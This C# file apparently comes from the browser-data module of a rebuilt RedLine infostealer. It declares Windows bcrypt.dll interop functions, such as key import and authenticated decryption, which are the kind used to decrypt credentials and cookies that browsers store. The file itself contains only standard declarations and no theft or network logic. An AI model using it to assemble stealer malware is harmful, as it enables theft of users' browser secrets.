using System;
using System.Runtime.InteropServices;
using RedLine.Reburn.Models.Enums;

namespace RedLine.Reburn.Data.Browsers;

public static class BCrypt
{
	[DllImport("bcrypt.dll")]
	public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	[DllImport("bcrypt.dll")]
	internal static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	[DllImport("bcrypt.dll")]
	public static extern uint BCryptDestroyKey(IntPtr hKey);

	[DllImport("bcrypt.dll")]
	internal static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);
}
